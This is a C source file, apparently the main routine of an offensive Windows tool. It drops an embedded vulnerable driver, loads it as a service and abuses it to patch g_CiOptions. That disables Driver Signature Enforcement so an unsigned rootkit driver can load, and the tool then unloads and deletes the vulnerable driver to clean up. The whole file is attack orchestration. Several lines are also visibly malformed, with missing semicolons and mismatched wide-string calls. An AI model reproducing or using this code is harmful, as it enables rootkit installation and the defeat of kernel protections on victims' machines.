#include "common.h"
#include "vdriver.h"

int main() {

	LPWSTR szVulnDriverPath = NULL;

	// Check if DSE is enabled. If it is disabled or testsigning mode is enabled then exit
	info("CheckDSE - Checking if DSE is enabled");
	if (!CheckDSE()) {
		error("CheckDSE - DSE disabled or testsigning is enabled");
		error("CheckDSE - Quitting no need to disable DSE")
		return EXIT_FAILURE;
	}
	okay("CheckDSE - DSE Enabled");
	printf("\n");

	// Load CI.dll symbols from the internet and calculate required offsets for DSE
	info("LoadNtoskrnlOffsetsFromInternet - Loading CI symbols from internet");
	if (!LoadNtoskrnlOffsetsFromInternet(TRUE)) {
		error("LoadNtoskrnlOffsetsFromInternet - Failed to load CI symbols");
		return EXIT_FAILURE;
	}
	PrintNtoskrnlOffsets();
	okay("LoadNtoskrnlOffsetsFromInternet - Loaded CI symbols")
	printf("\n");

	// Write the vulnerable driver to the file system
	info("WriteDriverToFile - Writing vulnerable driver to filesystem");
	if (!WriteDriverToFile(g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
		error("Failed to write driver to filesystem");
		if (szVulnDriverPath) {
			free(szVulnDriverPath); // Free the allocated memory
		}
		return EXIT_FAILURE;
	}
	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
	printf("\n");

	// Load the vulnerable driver as a service
	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
		error("LoadDriver - Failed to load driver");
		return EXIT_FAILURE;
	}
	okayW("LoadDriver - Loaded vulnerable driver, servicename: \"%s\"", g_VULNDRIVERNAME);
	printf("\n");

	// Disable DSE by patching g_CiOptions and load the unsigned rootkit driver
	info("DisableDSEAndStartRootkit - Disabling DSE by abusing vulnerable driver and loading rootkit driver");
	if (!DisableDSEAndStartRootkit()) {
		error("DisableDSEAndStartRootkit - Failed to disable DSE and load rootkit driver")
	}
	info("DisableDSEAndStartRootkit - DSE Disabled/Reanabled and rootkit driver loaded");
	printf("\n");

	// ** CLEANUP SECTION ** //

	// Unloading vulnerable driver
	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	if (!UnloadDriver(g_VULNDRIVERNAME)) {
		error("UnloadDriver - Failed to unload driver");
	}
	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	printf("\n");

	// Remove vulnerable driver from filesystem
	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
	if (!RemoveFileW(szVulnDriverPath)) {
		error("RemoveFileW - Failed to delete file");
		// Free allocated memory
		if (szVulnDriverPath) {
			free(szVulnDriverPath);
		}
		return EXIT_FAILURE;
	}
	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
	printf("\n");

	// Free allocated memory
	if (szVulnDriverPath != NULL) {
		free(szVulnDriverPath);
	}

	return EXIT_SUCCESS;
}